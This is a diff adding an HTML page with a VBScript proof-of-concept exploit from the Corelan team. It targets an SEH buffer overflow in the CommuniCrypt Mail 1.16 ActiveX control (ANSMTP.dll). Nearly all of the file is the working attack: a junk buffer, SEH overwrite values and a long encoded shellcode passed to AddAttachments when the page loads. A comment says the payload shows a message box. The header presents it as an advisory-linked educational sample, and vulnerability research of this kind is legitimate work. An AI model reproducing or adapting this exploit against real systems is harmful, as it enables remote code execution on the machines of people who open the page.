@@ -1,0 +1,71 @@
+<html>
+<!--
+        |------------------------------------------------------------------|
+        |                         __               __                      |
+        |   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+        |  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+        | / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+        | \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+        |                                                                  |
+        |                                       http://www.corelan.be:8800 |
+        |                                              security@corelan.be |
+        |                                                                  |
+        |-------------------------------------------------[ EIP Hunters ]--|
+ 
+# Software      : CommuniCrypt Mail 1.16 (ANSMTP.dll/AOSMTP.dll) ActiveX
+# Author        : Lincoln
+# Date		: May 19, 2010
+# Reference     : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-042
+# OS            : Windows
+# Tested on     : XP SP3 En (VirtualBox)
+# Type of vuln  : SEH
+# Greetz to     : Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+#
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+#
+# Note : you are not allowed to edit/modify this code.
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+#
+# Communicrypt is running a vulnerable version of ANSMTP.dll/AOSMTP.dll
+# See advisory for more details
+#
+-->
+<object classid='clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82' id='target' ></object>
+<script language='vbscript'>
+
+junk = String(284, "A") 
+nseh = unescape("%eb%06%90%90")
+seh  = unescape("%1c%e4%01%10")
+align = unescape("%5a%5a%5c%5a%5a%5a%5a%5a%90%90%90%90")
+
+'msgbox: "Exploited by Corelan Security Team"
+sc   = ("TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIK9KS8Z") & _
+("N7XYT3JT1IPI1YPI1YQYG9QY790IW9W9730CPCPC73QSP7610ZBJQQ0X0P6PQQP0712K1QW1PQ") & _
+("GBQQQRFR72G2VPQRW21Q1RQHPP7HW1W2RUQZPIQZ2Y1ZPKPM0KPKCYPQSTQU2TPJPTQUU10NVR") & _
+("PNV2PBQJQVV1QYPYPBPD0N2KPQ51QTRPPLPKPC761TPL0NBK1R0V772LPLPKV1F6W478PL0KV1") & _
+("RNQURPPNRK1U2FPPVX600OQWCXF02UPLVSPPQI1U0Q0KU1PKPOQXU1V1T0PL0KF0RLQV1TQURT") & _
+("PL0K0Q0UQW0LPLPK0PV40CVUPPT81SFQ0KPZPL0K0B3ZW758PNBK1S3ZQWPPPE0QPJPKW8SSG6") & _
+("PWV0QYPN2KQTBTPLPKQUPQPJPNQT2Q1YROF06QPK400KPL0NPLPO44PKRPQSQT0F2JPJ3QQZBO") & _
+("W40MPGD10KSG78SYPJV1PK0OQYBO1Y2O0EBK1SPL1U44PQVXV1BEPIPN0NBKW2CJQURTQUV1PJ") & _
+("PKQS1F0NBK0F2LW2BK0LPKQSRJQU0LPCFQQZPKPNRKQUV4PNRK1WRQ0MP8POBYV10T1V1T772L") & _
+("1U6QPJ53POW2QTQX0F79QX1DPOD9PKV50MF979V2PP58PLPN0PPNW4PNQXRLPPPRPK68PMPLPK") & _
+("0OQY2OPKPOPO49F1PUQVE4PMRKPQBNW9W8PMP20Q53PLW71UPLPD54611RPMP8PN2K792OQYBO") & _
+("PKPOPL1YG255PGD8G3PX72PLPPRLPERPPKPOV1SHPGQSW5CRQVPNPEWDQU6XPQ5561RCW5VUPD") & _
+("VRPM680QPLQTE40DQZ0LQYQXE6PCU60K0OPC2EQVU4PL79PK42V0600MRKPNPHPL5260PM0MBL") & _
+("PN2GW72L77QDW6P2PKQHPCRN79ROQYBOQYROPBQX0QT4W5RQPQW8QUT0PC1HW46P1SPGPB0N1R") & _
+("QUW4RQPK2KPKFXQS2L7544W6RFPK091XSS1UGH0P3QQRPM60QHQURPPQT8QRPYQUT0V0PTPQSE") & _
+("0QSHPDVU1S0BPPE90Q3T1SPX0QP0QSBCQU6U1SPSPQT8PBQU1RPL0PE10PBN1R1X0QFP0QPSPP") & _
+("RO60SBQUVXW30TPQ6PPPRBPCPIPQ481RPO73PYQRV4PPCUPQ3HW2E5PQU8QRPPPP2LW6PQPHQY") & _
+("PNRH0PPL1VQTQURR0M69PI2QW4T1PJ2RQSSRQSSS0PPQQVP2PKPOPHPP60FQPOFPQV6PPKPO61") & _
+("W5740HQU1JQQG1A")
+
+
+boom = junk + nseh + seh + align + sc
+
+target.AddAttachments boom
+
+</script>
+</html>
